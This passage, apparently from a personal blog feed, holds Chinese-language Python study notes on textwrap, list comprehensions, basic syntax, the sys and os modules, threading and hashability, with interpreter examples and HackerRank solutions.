        <content type="html"><![CDATA[<h1 id="textwrap">textwrap</h1><p>我是从 hackrank 的 <ahref="https://www.hackerrank.com/challenges/text-wrap/problem">text wrap题目</a>了解到这个模块，稍微记录学下以下吧，挺方便的。</p><p>The textwrap module can be used for wrapping and formatting of plaintext. textwrap 提供函数<code>wrap()</code>、<code>fill()</code>、<code>indent()</code>、<code>dedent()</code>和以及<code>TextWrapper</code> 类。</p><p>如果只是要对一两个文本字符串进行自动换行或填充，直接用函数应该就够了；否则的话，应该使用TextWrapper 的实例来提高效率。这里只介绍常见的几个函数便于临时使用，如果需要深度使用，再去学。</p><ol type="1"><li><p><code>textwrap.wrap(text, width=70, **kwargs)</code> Wraps thesingle paragraph in text (a string) so every line is at most widthcharacters long. Returns a list of output lines, without finalnewlines.</p><p><code>kwargs</code> 参数， 可选，一般默认，与<code>TextWrapper</code>类的属性有关。</p><p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import textwrap</span><br><span class="line">In [26]: text = &quot;helloworldthis isn&#x27;t..&quot;</span><br><span class="line">In [27]: textwrap.wrap(text, 5)</span><br><span class="line">Out[28]: [&#x27;hello&#x27;, &#x27;world&#x27;, &#x27;this &#x27;, &quot;isn&#x27;t&quot;, &#x27;..&#x27;]</span><br></pre></td></tr></table></figure></p><p>注意:空格也算</p></li><li><p>textwrap.fill(text, width=70, **kwargs) Wraps the singleparagraph in text, and returns a single string containing the wrappedparagraph. fill() is shorthand for<code>"\n".join(wrap(text, ...))</code>,根据指定长度拆分字符串，然后逐行显示。</p><p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">31</span>]: textwrap.fill(text,<span class="number">5</span>)</span><br><span class="line">Out[<span class="number">31</span>]: <span class="string">&quot;hello\nworld\nthis \nisn&#x27;t\n..&quot;</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">32</span>]: <span class="built_in">print</span>(textwrap.fill(text,<span class="number">5</span>))</span><br><span class="line">hello</span><br><span class="line">world</span><br><span class="line">this</span><br><span class="line">isn<span class="string">&#x27;t</span></span><br><span class="line"><span class="string">..</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure></p></li></ol><p>3.textwrap.indent(text, prefix, predicate=None) Add prefix to thebeginning of selected lines in text. 在每行前面添加前缀 prefix</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">34</span>]: text = <span class="string">&quot;&quot;&quot;hello</span></span><br><span class="line"><span class="string">...: world</span></span><br><span class="line"><span class="string">...: this</span></span><br><span class="line"><span class="string">...: is</span></span><br><span class="line"><span class="string">...: a</span></span><br><span class="line"><span class="string">...: &quot;&quot;&quot;</span></span><br><span class="line"> In [<span class="number">35</span>]: text</span><br><span class="line"> Out[<span class="number">35</span>]: <span class="string">&#x27;hello\nworld\nthis\nis\na\n&#x27;</span></span><br><span class="line"></span><br><span class="line">    In [<span class="number">37</span>]: textwrap.indent(text, <span class="string">&quot;---&quot;</span>)</span><br><span class="line">    Out[<span class="number">37</span>]: <span class="string">&#x27;---hello\n---world\n---this\n---is\n---a\n&#x27;</span></span><br><span class="line"></span><br><span class="line">    In [<span class="number">38</span>]: <span class="built_in">print</span>(textwrap.indent(text, <span class="string">&quot;---&quot;</span>))</span><br><span class="line">    ---hello</span><br><span class="line">    ---world</span><br><span class="line">    ---this</span><br><span class="line">    ---<span class="keyword">is</span></span><br><span class="line">    ---a</span><br><span class="line"></span><br><span class="line">    ```</span><br><span class="line"></span><br><span class="line">参考推荐:</span><br><span class="line">[textwrap — Text wrapping <span class="keyword">and</span> filling](https://docs.python.org/<span class="number">3</span>/library/textwrap.html)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Python Comprehensions</title>
      <link href="/blog/2020/03/21/programming/python/1.basic/4.comprehension/"/>
      <url>/blog/2020/03/21/programming/python/1.basic/4.comprehension/</url>
      
        <content type="html"><![CDATA[<h1 id="list-comprehension">List Comprehension</h1><p>Practice:</p><ol type="1"><li><ahref="https://www.hackerrank.com/challenges/list-comprehensions/problem">ListComprehensions</a></li></ol><p>知识点：</p><ol type="1"><li><p>list comprehensions 在列表推导式中<code>for i in list_test</code>后面不需要加 <code>:</code> 常见的使用姿势:</p><p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[ [ i, j] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>( x + <span class="number">1</span>) <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>( y + <span class="number">1</span>) <span class="keyword">if</span> ( ( i + j ) != n )</span><br></pre></td></tr></table></figure></p></li><li><p><ahref="https://www.hackerrank.com/challenges/nested-list/forum">NestedLists</a></p></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">marksheet = []</span><br><span class="line">for _ in range(0,int(input())):</span><br><span class="line">    marksheet.append([input(), float(input())])</span><br><span class="line"></span><br><span class="line"># 先得到 second lowest 的分数</span><br><span class="line"></span><br><span class="line"># 先对分数去重</span><br><span class="line">deduplicated_mark = set([mark for name, mark in marksheet])</span><br><span class="line"></span><br><span class="line"># 对分数排序</span><br><span class="line">sorted_ded_mark = sorted(list(deduplicated_mark))</span><br><span class="line"></span><br><span class="line"># 获得第二的低分</span><br><span class="line">second_lowest = sorted_ded_mark[1]</span><br><span class="line"></span><br><span class="line"># 对总表进行排序</span><br><span class="line">sorted_marksheet = sorted(marksheet)</span><br><span class="line"></span><br><span class="line"># 循环遍历，得到总表中分数等于 second lowest 的名字</span><br><span class="line">print(&#x27;\n&#x27;.join([name for name, mark in sorted_marksheet if mark == second_lowest]))</span><br></pre></td></tr></table></figure><p>知识点:</p><ol type="1"><li><p>将列表转换为 set 去重</p></li><li><p>list comprehensions</p></li><li><p>join 在输出换行等分隔符时的用法</p></li><li><p><code>list.sort(key=..., reverse=...)</code></p><blockquote><p>By default, sort() doesn't require any extra parameters. However, ithas two optional parameters: reverse - If true, the sorted list isreversed (or sorted in Descending order) key - function that serves as akey for the sort comparison usage：</p></blockquote><p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># take second element for sort</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">takeSecond</span>(<span class="params">elem</span>):</span><br><span class="line">    <span class="keyword">return</span> elem[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># random list</span></span><br><span class="line">random = [(<span class="number">2</span>, <span class="number">2</span>), (<span class="number">3</span>, <span class="number">4</span>), (<span class="number">4</span>, <span class="number">1</span>), (<span class="number">1</span>, <span class="number">3</span>)]</span><br><span class="line"></span><br><span class="line"><span class="comment"># sort list with key</span></span><br><span class="line">random.sort(key=takeSecond)</span><br><span class="line"></span><br><span class="line"><span class="comment"># print list</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Sorted list:&#x27;</span>, random)</span><br></pre></td></tr></table></figure></p></li></ol>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> comprehensions </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python basic</title>
      <link href="/blog/2020/03/21/programming/python/1.basic/1.basic_grammars/"/>
      <url>/blog/2020/03/21/programming/python/1.basic/1.basic_grammars/</url>
      
        <content type="html"><![CDATA[<h1 id="帮助">帮助</h1><h2 id="dirc">dir(c)</h2><p>查看 c 对象所具有的方法</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>c=<span class="string">&#x27;hello&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">dir</span>(c)</span><br></pre></td></tr></table></figure><h2 id="help">help()</h2><p>查看某个对象的某个方法的帮助信息</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">help</span>(c.split)</span><br></pre></td></tr></table></figure><h1 id="运算符">运算符</h1><h2 id="arithmetic-operators">Arithmetic operators</h2><p><code>+</code>，<code>-</code>， <code>*</code> <code>/</code>: Floatdivision， 结果为浮点数。 <code>//</code>：Integer division，舍去小数，结果为正数。 <code>**</code>： 幂运算</p><h2 id="comparison-operators">Comparison operators</h2><p>返回值： <code>True</code> 或 <code>False</code></p><p><code>&lt;</code>, <code>&gt;</code>, <code>&lt;=</code>,<code>&gt;=</code>, <code>!=</code>, <code>==</code></p><h2 id="logical-operators">Logical operators</h2><p>逻辑运算符（逻辑与，或，非）： <code>and</code>， <code>or</code>，<code>not</code></p><h2 id="bitwise-operators">Bitwise operators</h2><p>位运算操作符（按位与，或，取反，异或， 左移，右移）:<code>&amp;</code>, <code>|</code>, <code>~</code>, <code>^</code>,<code>&lt;&lt;</code>, <code>&gt;&gt;</code></p><h2 id="assignment-operators">Assignment operators</h2><p>每个算数运算符，位运算符与等号分别结合，进行运算赋值操作。 举例：<code>=</code>， <code>+=</code>， <code>&amp;=</code></p><h2 id="special-operators">Special operators</h2><h3 id="identity-operators">Identity operators</h3><p>Two variables that are equal does not imply that they areidentical.</p><p><code>is</code>： True if the operands are identical (refer to thesame object， the same memory section) <code>a is b</code> 与<code>id(a) == id(b)</code> 一个意思</p><p><code>is not</code>： True if the operands are not identical (do notrefer to the same object)</p><h3 id="membership-operators">Membership operators</h3><p><code>in</code>： True if value/variable is found in the sequence</p><p><code>not in</code>： True if value/variable is not found in thesequence</p><p>作用：</p><ol type="1"><li><p>检查一个值是否在一个序列（list，range，stringetc.）中出现，如果包含，就返回 True，否则返回 False</p></li><li><p>通过 for 循环的序列进行迭代</p></li></ol><h1 id="name-属性"><strong>name</strong> 属性</h1><ul><li>每一个后缀为 .py 的文件都被视为一个 Python 模块，可以被其他 Python程序调用。</li><li>每一个 Python 脚本在运行时，都有一个<code>__name_</code>属性，通过它可以识别程序的使用方式，即：程序是在作为模块被导入，还是在独立运行。</li><li>如果程序是在作为模块被导入，那么 <code>__name_</code>属性的值就自动设置为模块名，如果脚本是在独立运行，那么<code>__name_</code> 属性的值会被自动设置为字符串 “<code>__name_</code>”</li></ul><h1 id="循环">循环</h1><p>在程序开发中，有三种流程方式：顺序、分支、循环。</p><h2 id="for-循环">for 循环</h2><p>通过 range() 生成连续数列</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>  i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">5</span>)</span><br></pre></td></tr></table></figure><p>range<em>(start, stop, step</em>)</p><table><colgroup><col style="width: 10%" /><col style="width: 89%" /></colgroup><thead><tr class="header"><th style="text-align: left;">Parameter</th><th style="text-align: left;">Description</th></tr></thead><tbody><tr class="odd"><td style="text-align: left;"><em>start</em></td><td style="text-align: left;">Optional. An integer number specifying atwhich position to start. Default is 0</td></tr><tr class="even"><td style="text-align: left;"><em>stop</em></td><td style="text-align: left;">Required. An integer number specifying atwhich position to end.</td></tr><tr class="odd"><td style="text-align: left;"><em>step</em></td><td style="text-align: left;">Optional. An integer number specifying theincrementation. Default is 1</td></tr></tbody></table><p>知识点：</p><ol type="1"><li>range 的 step 参数</li><li>切片超出范围不报错</li></ol><h3 id="range-逆序">range 逆序</h3><ol type="1"><li><p><code>range(5, -1, -1)</code> -- 正确，高效 It may be lessintuitive but as the comments mention, this is more efficient and theright usage of range for reversed list.</p></li><li><p><code>reversed(range(10))</code> -- 最直接如果想要将其变为列表的话，进行一下强制类型转换即可<code>list(reversed(range(10))</code></p></li><li><p><code>range(6)[::-1]</code> 切片逆序</p></li></ol><h1 id="函数">函数</h1><ol type="1"><li><code>def</code> 是英文 <code>define</code> 的缩写</li><li><strong>函数名称</strong>应该能表达<strong>函数封装代码</strong>的功能，方便后续调用<ul><li>可以由<strong>字母、数字和下划线</strong>组成</li><li><strong>不能以数字开头</strong></li><li><strong>不能与关键字重复</strong></li></ul></li></ol><p>注意: 不能将函数调用放在函数定义的上方，否则控制台会提示<code>NameError: name "xxx" is not defined</code>因为在使用函数名调用函数之前，必须要保证 <code>Python</code>已经知道函数的存在。</p><h2 id="函数注释">函数注释</h2><p>在函数下方使用多行注释（三个引号） 来进行注释。</p><p>注意：根据 Python 官方代码格式要求（PEP8）:因为函数体相对比较独立，函数定义的上方，应该和其他代码 ( 包括注释 )保留两个空行。</p><p>技巧：PyCharm 中将鼠标放到函数定义的名字那里，然后出现提示，我们<code>insert documentation stirng stub</code>,格式如下，然后当我们把光标放到使用函数的地方（函数名），然后按 Ctrl+Q快捷查看函数信息。最后在 Pycharm 空白区域点击一下，便退出。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">download</span>(<span class="params">url, img_dir</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;下载图片，并写入到指定位置</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    :param url: 图片的 url</span></span><br><span class="line"><span class="string">    :param img_dir: 要写入的图片目录</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><h2 id="函数返回值">函数返回值</h2><ul><li>对于逻辑运算，最终将布尔值返回的情况，不建议使用下面写法：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">f</span>():</span><br><span class="line"><span class="keyword">if</span> condition:</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure><p>使用下面的写法更好：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">f</span>():</span><br><span class="line"><span class="keyword">return</span> condition</span><br></pre></td></tr></table></figure><p>比如：判断闰年的例子</p><p>提示：工作中针对需求的变化，应该冷静思考，不要轻易修改之前已经完成的能够正常执行的函数。</p><h1 id="文件操作">文件操作</h1><h2 id="步骤">步骤</h2><ol type="1"><li>通过 open() 函数打开文件，并创建一个 File 对象</li><li>调用 File 对象的 read() 或 write()等方法，对文件内容进行读写操作</li><li>调用 File 对象的 close() 方法，关闭并保存文件内容</li></ol><p>文件的打开模式主要包括：</p><ol type="1"><li><p>r 只读模式（默认）</p></li><li><p>w只写模式（如果文件存在，则先清空原有内容，文件不存在则创建文件）</p></li><li><p>a 追加模式（不覆盖文件中原有内容）</p></li></ol><p>如果传递给 open()的文件名不存在，写模式和追加模式都会创建一个新的空文件。</p><h2 id="读取的方法">读取的方法</h2><ol type="1"><li><p>read()将所有内容读到一个字符串中（包括换行符）。可以加参数，指定要读多少个字符</p></li><li><p>readline() 一行一行读取，包括 </p></li><li><p>readlines(）将所有内容，按照行，分到列表中</p></li><li><p>seek(arg) 定位指针</p><p>seek(0） 将文件流指针定位到文件首。</p></li></ol><p>常用读取方法：</p><ol type="1"><li>for 循环与 readlines 迭代</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">f=open(&#x27;ip.txt&#x27;,&#x27;r&#x27;)</span><br><span class="line">for i in f.readlines():</span><br><span class="line">print(i,end=&#x27;&#x27;)</span><br></pre></td></tr></table></figure><p>因为读取的文件每行末尾有 ，而 print打印的时候，默认又会打印一个。所以<strong>最好的方法是让 print 不打印。</strong></p><p>或者通过字符串的 strip() 方法（默认去掉 whitespace，包括，空格）将文件中每一行末尾的 （Linux）或 （Windows）去除</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">f=open(&#x27;ip.txt&#x27;,&#x27;r&#x27;)</span><br><span class="line">for i in f.readlines():</span><br><span class="line">print(i.strip())</span><br></pre></td></tr></table></figure><h1 id="模块">模块</h1><p>模块是 Python 程序架构的一个核心概念。</p><h2 id="概念">概念</h2><ul><li><p>模块也叫库，每个模块中都内置了大量的功能函数、类和变量。它就像是积木，可以根据需要进行调用组合。</p></li><li><p>模块就是程序，每个模块就是一个后级为 .py 的 Python程序。</p></li><li><p>Python 的模块分为标准模块和第三方模块，标准模块是 Python 内置的，第三方模块则需要安装之后才能使用。</p></li><li><p>模块中定义的 <code>全局变量</code>、<code>函数</code>都是模块能够提供给外界直接使用的工具</p></li><li><p>可以通过 help 命令了解一个模块的基本帮助信息，如:help（'sys'）</p></li><li><p><strong>模块名也是一个标识符</strong>，即: 如果你的 Py文件想要可以当作模块被使用，其命名就要遵循标识符的命名规则。</p></li></ul><h2 id="pyc-文件">Pyc 文件</h2><blockquote><p>c 是 compiled 的意思</p></blockquote><p>当我们在导入自己写入的模块，并运行后，发现目录下生成了<code>__pycache__</code>的目录，其中包括我们导入的模块被解释后生成的二进制文件<code>.pyc</code>，用来加快速度（不用每次都解释，因为模块是相对固定，不修改经常修改的）</p><ul><li>这个 <code>pyc</code> 文件是由 python解释器将模块的源码转换为<code>字节码</code>， python 这样保存<code>字节码</code>是作为一种启动速度的优化。</li></ul><p>字节码 python 在解释源程序时，分两步：</p><ol type="1"><li>处理源码，解释生成字节码</li><li>对字节码进行处理，生成 CPU 能够识别的机器码。</li></ol><ul><li>有了模块的字节码之后，下次运行程序，如果在上次保存字节码之后，没有修改过源代码，Python 将会加载 .pyc 文件，并跳过编译这个步骤。</li><li>当 python 重编译时， 它会自动检查源文件和字节码文件的时间戳</li><li>如果你又修改了源代码，下次程序运行时，字节码将自动重新创建。</li></ul><h2 id="导入">导入</h2><ul><li><p>无论是标准模块，还是第三方模块，都需要先导入之后，才可以使用</p></li><li><p>在程序中应只导入必须的模块，以减少运行压力</p></li><li><p>导入方法</p><ul><li>直接导入模块 <code>import module_name</code></li><li>从模块中导入某个函数：<code>from module_name import function_name</code></li></ul></li><li><p>两种导入全部方法的方式</p><ul><li>import os 应采用 “模块名.方法名”的形式使用模块中的方法，如：os.system()</li><li>import os from * 可以直接使用方法名, 如：system()方法，无需加上模块名作为前缀。</li></ul></li></ul><h2 id="常用模块">常用模块</h2><h3 id="sys-模块">sys 模块</h3><h4 id="sys.argv">sys.argv()</h4><p>sys.argv 是一个列表变量，专门用来向 Python 解释器传递参数，类似 Shell脚本编程中的位置变量</p><p>脚本文件名 sys.argv[0]</p><p>用户输入的参数的数量 len(sys.argv) -1</p><p>所有参数 str(sys.argv)</p><p>第一个参数 sys.argv[1]</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">脚本文件名:d:/pyworkspace/banner.py</span><br><span class="line">用户输入的参数的数量：<span class="number">1</span></span><br><span class="line">所有参数：[<span class="string">&#x27;d:/pyworkspace/banner.py&#x27;</span>, <span class="string">&#x27;hello&#x27;</span>]</span><br><span class="line">第一个参数：hello</span><br></pre></td></tr></table></figure><h4 id="sys.exit">sys.exit()</h4><ul><li>sys.exit() 是一个方法，作用是推出当前程序</li><li>sys.exit() 退出当前程序，并返回 SystemExit 异常</li><li>sys.exit(0) 正常退出</li><li>sys.exit('程序退出‘) ， 退出时，显示一段提示信息</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) != <span class="number">2</span>:</span><br><span class="line">      <span class="built_in">print</span>(<span class="string">f&#x27;正确使用方法：<span class="subst">&#123;sys.argv[<span class="number">0</span>]&#125;</span> IP列表文件&#x27;</span>)</span><br><span class="line">      <span class="built_in">print</span>(<span class="string">&#x27;例如：banner.py ip.txt&#x27;</span>)</span><br><span class="line">      sys.exit()</span><br><span class="line">  filename=<span class="built_in">str</span>(sys.argv[<span class="number">1</span>].strip())</span><br></pre></td></tr></table></figure><h3 id="os-模块">os 模块</h3><ul><li><p>os 模块提供了访问操作系统服务的功能</p></li><li><p>它最常用的是 os.system() 方法，可以在 Python中使用操作系统命令。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">os.system(cls)</span><br></pre></td></tr></table></figure><p>os.path.isfile() 方法，判断指定的对象是否为文件，返回 True 或False</p><p>os.path.isdir() 方法，判断指定的对象是否为文件，返回 True 或False</p><p>os.path.exists() 方法，判断指定的对象是否为文件，返回 True 或False</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> os</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>os.path.isfile(<span class="string">&#x27;banner.py&#x27;</span>)</span><br><span class="line"><span class="literal">True</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>os.path.isdir(<span class="string">&#x27;banner.py&#x27;</span>)</span><br><span class="line"><span class="literal">False</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>os.path.exists(<span class="string">&#x27;banner.py&#x27;</span>)</span><br><span class="line"><span class="literal">True</span></span><br></pre></td></tr></table></figure></li></ul><h1 id="多线程">多线程</h1><p>通常通过多线程的方式来执行一个函数，从而使得该函数中的代码可以并发执行。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">t = threading.Thread(target=要执行的函数，args=(向函数传递的参数))</span><br><span class="line">t.start()</span><br></pre></td></tr></table></figure><p>因为 args是元组，所以如果元组中只有一个值的话，要在值后面加逗号，来指明它是元组。</p><p>一般只是用 Threading 中的 Thread类，所以很多脚本都是使用下面语句导入的。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Thread</span><br></pre></td></tr></table></figure><h1 id="optparse-模块">optparse 模块</h1><ul><li>利用该模块可以设置选项，</li></ul><h1 id="扩展">扩展</h1><p>引入 stderr 是因为：</p><p>1.操作员希望在屏幕上看到程序的运行进度，但是不希望看到诊断信息。2.当有人想重定向诊断信息时，悲剧发生了，正常输出也被重定向了，程序的运行开始变得不可预期。3.虽然引入的系统级标准错误文件，但依然存在多个程序同时输出诊断信息的问题。</p><p>很自然的，一个进程独占，诊断信息分离的输出流 stderr 就出现 节选自<ahref="https://zhuanlan.zhihu.com/p/29613516">何时使用 STDERR？ -知乎</a></p><h2 id="参考资料">参考资料</h2><blockquote><p><ahref="https://www.programiz.com/python-programming/operators">PythonOperators</a> &gt; <ahref="https://stackoverflow.com/questions/7286365/print-a-list-in-reverse-order-with-range">Printa list in reverse order with range()?</a> &gt; <ahref="https://blog.csdn.net/linian71/article/details/78712485">Pythonrange 逆序迭代</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Hashability in Python</title>
      <link href="/blog/2020/03/21/programming/python/1.basic/13.hashability/"/>
      <url>/blog/2020/03/21/programming/python/1.basic/13.hashability/</url>
      
        <content type="html"><![CDATA[<h2 id="introduction">Introduction</h2><blockquote><p>hashable</p><p>An object is hashable if it has a hash value which never changesduring its lifetime (it needs a <code>__hash__()</code> method), and canbe compared to other objects (it needs an <code>__eq__()</code> method).Hashable objects which compare equal must have the same hash value.</p><p>Hashability makes an object usable as a <strong>dictionary key and aset</strong> member, because these data structures use the hash valueinternally.</p><p>Most of Python’s immutable built-in objects are hashable; mutablecontainers (such as lists or dictionaries) are not; <strong>immutablecontainers (such as tuples and frozensets) are only hashable if theirelements are hashable</strong>. Objects which are instances of<strong>user-defined classes are hashable by default</strong>. They allcompare unequal (except with themselves), and <strong>their hash valueis derived from their <code>id()</code></strong>.</p><p>--From the <a href="https://docs.python.org/3/glossary.html">Pythonglossary</a></p></blockquote><h2 id="which-objects-are-hashable-and-which-are-not">Which Objects AreHashable and Which Are Not</h2><p>我们知道 <code>set</code> 的元素和 <code>dict</code> 的键 key 要求是hashable 的，因此我通过了 <code>set</code> 测试，得出如下结果：</p><p>Hashable data types: int, float, str, tuple, and NoneType. Unhashabledata types: dict, list, and set.</p><p>测试过程：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">1</span>]: test_set=<span class="built_in">set</span>()</span><br><span class="line">In [<span class="number">2</span>]: test_set.add(<span class="literal">None</span>)</span><br><span class="line">In [<span class="number">3</span>]: test_set.add(<span class="number">1</span>)</span><br><span class="line">In [<span class="number">4</span>]: test_set.add(<span class="number">2.1</span>)</span><br><span class="line">In [<span class="number">5</span>]: test_set.add(<span class="literal">True</span>)</span><br><span class="line">In [<span class="number">6</span>]: test_set.add(<span class="string">&quot;hello&quot;</span>)</span><br><span class="line">In [<span class="number">7</span>]: test_set.add((<span class="string">&quot;name&quot;</span>, <span class="string">&quot;tel&quot;</span>))</span><br><span class="line"></span><br><span class="line">In [<span class="number">8</span>]: test_set.add(&#123;<span class="string">&quot;name&quot;</span>: <span class="number">123</span>&#125;)</span><br><span class="line">-------------------------------------------------------------------</span><br><span class="line">TypeError                         Traceback (most recent call last)</span><br><span class="line">&lt;ipython-<span class="built_in">input</span>-<span class="number">8</span>-9df12f1bbe21&gt; <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">----&gt; <span class="number">1</span> test_set.add(&#123;<span class="string">&quot;name&quot;</span>: <span class="number">123</span>&#125;)</span><br><span class="line"></span><br><span class="line">TypeError: unhashable <span class="built_in">type</span>: <span class="string">&#x27;dict&#x27;</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">9</span>]: test_set.add([<span class="number">1</span>,<span class="number">2</span>])</span><br><span class="line">-------------------------------------------------------------------</span><br><span class="line">TypeError                         Traceback (most recent call last)</span><br><span class="line">&lt;ipython-<span class="built_in">input</span>-<span class="number">9</span>-951f4013eb98&gt; <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">----&gt; <span class="number">1</span> test_set.add([<span class="number">1</span>,<span class="number">2</span>])</span><br><span class="line"></span><br><span class="line">TypeError: unhashable <span class="built_in">type</span>: <span class="string">&#x27;list&#x27;</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">11</span>]: test_set.add(&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125;)</span><br><span class="line">-------------------------------------------------------------------</span><br><span class="line">TypeError                         Traceback (most recent call last)</span><br><span class="line">&lt;ipython-<span class="built_in">input</span>-<span 